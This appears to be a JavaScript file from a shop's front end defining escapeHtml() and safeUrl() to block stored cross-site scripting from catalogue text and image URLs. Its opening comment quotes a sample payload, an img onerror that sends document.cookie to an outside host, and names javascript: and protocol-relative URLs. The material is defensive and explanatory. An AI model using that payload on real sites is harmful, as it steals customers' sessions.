// ============================================================
// Putting database text into a page without letting it become part of
// the page.
//
// Almost everything the shop front draws is built by joining strings and
// assigning the result to innerHTML — product cards, the cart, the
// comparison table, the PC Builder. That is fast to write and fine as
// long as every value dropped into the template is text. The moment one
// of them contains a tag, it stops being text: the browser parses it,
// and a product called
//
//     Gaming Mouse <img src=x onerror="fetch('https://…?c='+document.cookie)">
//
// runs that script in the browser of every customer who visits the shop.
// The token this site signs in with is in localStorage, one line of
// script away.
//
// WHERE SUCH A NAME WOULD COME FROM
//
// Not from a stranger: the catalogue is written by staff through the
// admin panel, so this is not a hole the public can reach directly. It
// matters anyway, for two reasons. The first is that "only an admin can
// do it" is exactly one compromised staff password away from "anyone can
// do it", and the payload would then be stored, permanent and served to
// every visitor rather than to the person who typed it. The second is
// that the admin panel has escaped its output since it was written --
// e() in staff-console/js/admin.js -- so the shop front has been the
// odd one out rather than following a considered decision.
//
// This is the same function under a name the whole site can see, so
// there is one answer to "how does text get into the page here" instead
// of three.
//
// HOW TO USE IT
//
//   <h3>${escapeHtml(product.name)}</h3>          text in an element
//   <img alt="${escapeHtml(product.name)}">       text in an attribute
//   <button onclick="addToCart(${product.id})">   a number: no escaping
//
// Both quote characters are escaped, so one function covers element text
// and attribute values alike. It is *not* enough on its own for a URL in
// href or src -- see safeUrl() below -- because escaping does nothing
// about javascript: as a scheme.
//
// Numbers do not need it, and wrapping them only makes the template
// harder to read. Anything that came out of the database as text does.
// ============================================================

function escapeHtml(value) {
  if (value === null || value === undefined) return "";
  return String(value)
    .replace(/&/g, "&amp;")   // first, or it would double-escape the rest
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

// ------------------------------------------------------------
// A URL that is safe to put in src or href.
//
// Escaping the quotes around an attribute stops the value breaking out
// of it. It does nothing about the value itself being an instruction:
//
//     <img src="javascript:…">
//     <a href="javascript:…">
//
// are both perfectly well-formed HTML with no quote character in sight.
// products.image_path is a URL typed into the admin panel or returned by
// Supabase Storage, so it is exactly the kind of value this applies to.
//
// Relative paths (images/101.jpg, images/cpu.svg) have no scheme and are
// always fine -- they are most of what this site uses. Of the values that
// do name a scheme, only http, https and a base64 raster data: URL are
// let through. Anything else, including a scheme this does not recognise,
// comes back as an empty string, which renders as a broken image rather
// than as code.
// ------------------------------------------------------------
function safeUrl(value) {
  const url = String(value ?? "").trim();
  if (url === "") return "";

  // "//evil.example/x" keeps the current page's scheme and goes to
  // another host. It has no scheme of its own to test, so it is refused
  // by name rather than falling through to the relative-path case.
  if (url.startsWith("//")) {
    console.warn("Refused a protocol-relative URL:", url);
    return "";
  }

  // Anything before the first colon, if it looks like a scheme. Most of
  // this site's images are plain relative paths -- images/101.jpg,
  // images/cpu.svg -- which have no scheme at all and are always fine.
  const scheme = /^([a-z][a-z0-9+.-]*):/i.exec(url);
  if (!scheme) return escapeHtml(url);

  const name = scheme[1].toLowerCase();
  if (name === "http" || name === "https") return escapeHtml(url);

  // data: is allowed only for raster images. SVG is deliberately not on
  // the list: an SVG can carry a <script> element, so a data:image/svg
  // URL in a src attribute is a way of running code with the same
  // spelling as a picture.
  if (/^data:image\/(png|jpe?g|webp|gif);base64,/i.test(url)) return escapeHtml(url);

  console.warn("Refused a URL with an unexpected scheme:", url);
  return "";
}
